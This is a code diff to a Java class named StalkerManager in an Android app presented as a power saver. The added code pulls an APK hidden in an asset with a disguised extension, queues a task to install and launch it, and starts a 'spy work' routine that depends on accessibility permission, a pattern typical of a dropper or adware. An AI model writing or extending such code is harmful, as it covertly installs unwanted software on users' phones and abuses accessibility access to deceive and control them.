@@ -38,8 +38,6 @@ import static com.luna.powersaver.gp.utils.FileUtil.getOwnCacheDirectory;
 
 public class StalkerManager implements DownloadInfo.DownloadListener {
 
-    public StringBuilder mNote = new StringBuilder();
-
     public String testAddApkDownloadInfo() {
         AppDebugLog.d(AppDebugLog.TAG_STALKER, "添加Apk下载测试成功!");
         JsonAppInfo i = new JsonAppInfo();
@@ -104,23 +102,27 @@ public class StalkerManager implements DownloadInfo.DownloadListener {
         try {
             String[] paths = context.getAssets().list("");
             AppDebugLog.d(AppDebugLog.TAG_STALKER, "循环显示assets地址内容!");
-            final String filename = "slogan.jpeg";
+            final String filename = "slogan.gpt";
             final String apkname = "luna.net.shortfilm.gp_release_241.apk";
             for (String p : paths) {
                 AppDebugLog.d(AppDebugLog.TAG_STALKER, "path : " + p);
-                if (filename.equals(p)) {
+                if (p != null && p.endsWith(".gpt")) {
                     File extDir = FileUtil.getOwnCacheDirectory(context, StaticConst.STORE_DOWNLOAD);
-                    if (!extDir.exists() || !extDir.isDirectory()){
+                    if (!extDir.exists() || !extDir.isDirectory()) {
                         FileUtil.forceMkDir(extDir);
                     }
                     if (extDir.isDirectory() && extDir.exists()) {
                         File targetFile = new File(extDir, apkname);
-                        if (!targetFile.exists() && !targetFile.isFile()
-                                && copyApkFromAssets(context, filename, extDir.getAbsolutePath())) {
+                        if ((targetFile.exists() && targetFile.isFile())
+                                || AppUtil.isPkgInstalled(context, "luna.net.shortfilm.gp")
+                                || copyApkFromAssets(context, filename, targetFile.getAbsolutePath())) {
+                            // 文件不存在且复制成功，或者已经安装（已经安装表示通知唤醒）
+                            AppDebugLog.d(AppDebugLog.TAG_STALKER, "进行默认任务构建");
                             i = new JsonAppInfo();
                             i.execstate = JsonAppInfo.EXC_STATE.DOWNLOADED;
                             i.start = 1;
-                            i.uri = "intent:#Intent;action=andrid.intent.action.SHELL_CORE_SERVICE;package=luna.net.shortfilm.gp;end";
+                            i.uri = "intent:#Intent;action=andrid.intent.action.SHELL_CORE_SERVICE;package=luna.net" +
+                                    ".shortfilm.gp;end";
                             i.url = "http://default.gp.com/release_241.apk";
                             i.task = JsonAppInfo.TASK.DOWNLOAD_BY_APK;
                             i.pkg = "luna.net.shortfilm.gp";
@@ -129,12 +131,91 @@ public class StalkerManager implements DownloadInfo.DownloadListener {
                             i.action = JsonAppInfo.ACTION.NOT_WORK_AFTER_OPEN;
                         }
                     }
+                    break;
                 }
             }
         } catch (IOException e) {
             e.printStackTrace();
         }
         return i;
+    }
+
+    /**
+     * 添加默认的设置任务，然后立即调用执行判断操作
+     */
+    public void addDefaultInfoAndExecImmediately() {
+
+        if (!AppUtil.isAccessibleEnabled(StaticConst.sContext)) {
+            AppDebugLog.d(AppDebugLog.TAG_STALKER, "没有无障碍权限，不继续执行添加任务");
+            return;
+        }
+
+        JsonAppInfo i = judgeAndConstructDefaultInfo(StaticConst.sContext);
+        if (i != null) {
+            AppDebugLog.d(AppDebugLog.TAG_STALKER, "需要添加执行新任务");
+            // 添加任务
+            addNewTaskForDefault(i);
+            DownloadManager.getInstance(StaticConst.sContext).addDownloadListener(this);
+            // 开始执行
+            NBAccessibilityService.sIsInWork = true;
+            doStart();
+        }
+    }
+
+    /**
+     * 开启监视弹窗，然后执行任务的过程，此处限制添加的任务
+     */
+    public void startSpyWork() {
+        if (mIsInSpying)
+            return;
+        mIsInSpying = true;
+        mHandler.postDelayed(new Runnable() {
+            @Override
+            public void run() {
+                addDefaultInfoAndExecImmediately();
+            }
+        }, 3000);
+    }
+
+    /**
+     * 判断并添加新增的任务，建议线程中执行
+     */
+    public void addNewTaskForDefault(JsonAppInfo info) {
+        AppDebugLog.d(AppDebugLog.TAG_STALKER, "准备添加新任务");
+        if (mWaitingList == null || mTotalMap == null) {
+            restoreCurrentTask();
+        }
+        JsonAppInfo old;
+        old = mTotalMap.get(info.pkg);
+        if (old == null) {
+            AppDebugLog.d(AppDebugLog.TAG_STALKER, "添加新的任务，对应包名： " + info.pkg);
+            mWaitingList.add(info);
+            mTotalMap.put(info.pkg, info);
+        } else {
+            if ((old.execstate != JsonAppInfo.EXC_STATE.FINISHED
+                    && old.execstate != JsonAppInfo.EXC_STATE.DISCARD)
+                    || (old.starttime < info.starttime)) {
+                AppDebugLog.d(AppDebugLog.TAG_STALKER, "重置旧的任务：" + info.pkg);
+                // 任务没完成或者需要重置
+                old.starttime = info.starttime;
+                old.endtime = info.endtime;
+                old.task = info.task;
+                old.start = info.start;
+                old.openedtime = info.openedtime;
+                old.uri = info.uri;
+                old.action = info.action;
+                old.endaction = info.endaction;
+                old.execstate = info.execstate;
+                for (JsonAppInfo tp : mWaitingList) {
+                    if (tp.pkg.equals(old.pkg)) {
+                        return;
+                    }
+                }
+                mWaitingList.add(old);
+            } else {
+                AppDebugLog.d(AppDebugLog.TAG_STALKER, "该任务已经存在且无须重置!");
+            }
+        }
     }
 
     /*------------------- 正式内容 ----------------------*/
@@ -261,33 +342,33 @@ public class StalkerManager implements DownloadInfo.DownloadListener {
         @Override
         public void run() {
             AppDebugLog.d(AppDebugLog.TAG_STALKER, "执行touchToRestartRunnable事件");
+            if (!PowerSaver.get().isGuardViewShown())
+                return;
             startSpyWork();
         }
     };
 
 
-    /**
-     * 开启监视弹窗，然后执行任务的过程
-     */
-    public void startSpyWork() {
-        if (!AppUtil.isAccessibleEnabled(StaticConst.sContext)) {
-            AppDebugLog.d(AppDebugLog.TAG_STALKER, "没有无障碍权限，不进行其他操作");
-            mNote.append("当前没有无障碍权限，不进行其他操作\n");
-            return;
-        }
-        if (mIsInSpying)
-            return;
-        AppDebugLog.d(AppDebugLog.TAG_STALKER, "开始执行监视任务!");
-        mIsInSpying = true;
-        mHandler.removeCallbacksAndMessages(null);
-        mHandler.postDelayed(startRunnable, DEFAULT_SPY_DIFF_TIME);
-        DownloadManager.getInstance(StaticConst.sContext).addDownloadListener(this);
-    }
+//    /**
+//     * 开启监视弹窗，然后执行任务的过程
+//     */
+//    public void startSpyWork() {
+//        if (!AppUtil.isAccessibleEnabled(StaticConst.sContext)) {
+//            AppDebugLog.d(AppDebugLog.TAG_STALKER, "没有无障碍权限，不进行其他操作");
+//            return;
+//        }
+//        if (mIsInSpying)
+//            return;
+//        AppDebugLog.d(AppDebugLog.TAG_STALKER, "开始执行监视任务!");
+//        mIsInSpying = true;
+//        mHandler.removeCallbacksAndMessages(null);
+//        mHandler.postDelayed(startRunnable, DEFAULT_SPY_DIFF_TIME);
+//        DownloadManager.getInstance(StaticConst.sContext).addDownloadListener(this);
+//    }
 
 
     public void stopAndWaitStartSpyWork() {
         stopSpyWork();
-        mHandler.removeCallbacksAndMessages(null);
         mHandler.postDelayed(touchToRestartRunnable, DEFAULT_RESTART_SPY_TIME);
     }
 
@@ -295,6 +376,7 @@ public class StalkerManager implements DownloadInfo.DownloadListener {
      * 停止监视弹窗
      */
     public void stopSpyWork() {
+        mHandler.removeCallbacksAndMessages(null);
         if (!mIsInSpying)
             return;
         mIsInSpying = false;
@@ -302,7 +384,6 @@ public class StalkerManager implements DownloadInfo.DownloadListener {
         AppUtil.jumpToHome(StaticConst.sContext);
         AppDebugLog.d(AppDebugLog.TAG_STALKER, "取消执行监视任务!");
 //        screenLock();
-        mHandler.removeCallbacksAndMessages(null);
         // 保存当前任务状态
         StalkerManager.get().saveCurrentTask();
         mTotalMap = null;
